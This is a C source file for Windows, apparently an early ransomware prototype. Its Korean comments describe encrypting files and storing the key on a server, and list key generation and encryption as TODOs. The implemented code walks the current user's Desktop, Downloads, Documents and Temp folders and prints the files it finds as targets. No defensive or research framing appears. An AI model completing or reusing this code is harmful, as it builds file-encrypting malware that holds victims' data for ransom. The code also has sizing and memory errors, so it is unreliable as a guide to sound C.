#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <locale.h>
#include "files.h"

// 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
// 서버용 , 클라이언트
// 타깃을 구조체로 묶어 재분류 하라는 것이
// Desktop, Downloads, Documents ...Temp를 한 구조체 안에서 다루도록
// TODO : 키생성, 암호화

// TODO 3. 파일 분리하기

int main() {

    _wsetlocale(LC_ALL, L"Korean" );
    wchar_t* dirPrefix; 
    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
    wcscpy(dirPrefix, L"C:\\Users\\");
    wchar_t *userName = getUserName();
    printf("%S\n", userName);
    wcscat(dirPrefix, userName);

    wchar_t* dir = (wchar_t*)malloc(sizeof(wchar_t*)*100);
    memset(dir, 0, sizeof(wchar_t*) * 100);
    wcscat(dir, dirPrefix);


    struct FILES files;

    //[1] Desktop
    wcscat(dir, DESKTOP_DIR);
    getDirectoryFileList(dir, files.desktop);
    for(int i = 0; i < 100; i++) {
        if(files.desktop[i][0] == '\0') break;
        printf("%S\n", files.desktop[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);
    
    // [2]  Downloads
    wcscat(dir, DOWNLOADS_DIR);
    getDirectoryFileList(dir, files.downloads);
    for(int i = 0; i < 100; i++) {
        if(files.downloads[i][0] == '\0') break;
        printf("%S\n", files.downloads[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);

    // [3]  Documents
    wcscat(dir, DOCUMENTS_DIR);
    getDirectoryFileList(dir, files.documents);
    for(int i = 0; i < 100; i++) {
        if(files.documents[i][0] == '\0') break;
        printf("%S\n", files.documents[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);

    // [4]  AppData/Local/Temp
    wcscat(dir, APPDATA_DIR);
    getDirectoryFileList(dir, files.appData);
    for(int i = 0; i < 500; i++) {
        if(files.appData[i][0] == '\0') break;
        printf("%S\n", files.appData[i]);
    }

    free(dir);
    free(dirPrefix);
}


